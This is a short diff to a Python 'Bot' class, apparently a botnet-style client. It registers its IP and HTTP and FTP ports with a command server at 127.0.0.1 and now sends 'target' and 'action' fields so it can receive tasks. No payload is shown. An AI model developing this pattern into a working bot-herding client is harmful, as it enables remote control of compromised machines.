@@ -12,13 +12,11 @@ class Bot:
     myIp = socket.gethostbyname(socket.gethostname())
     host = '127.0.0.1'
     port = 49171
-    status = ''
     httpPort = 80
     ftpPort = 1111
 
     def __init__(self):
         self.sendInfo()
-        self.status = 'waiting'
         task = []
         with ThreadPoolExecutor(max_workers=2) as exec:
             task.append(exec.submit(self.httpServer()))
@@ -30,7 +28,7 @@ class Bot:
         try:
             s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
             s.connect((self.host, self.port))
-            message = self.myIp + ' {"http":' + str(self.httpPort) + ',"ftp":' + str(self.ftpPort) + ',"status":"waiting"}'
+            message = self.myIp + ' {"http":' + str(self.httpPort) + ',"ftp":' + str(self.ftpPort) + ',"target":"","action":"waiting"}'
             while message != 'bot registrated succesfully':
                 s.send(message.encode())
                 message = s.recv(1024).decode()
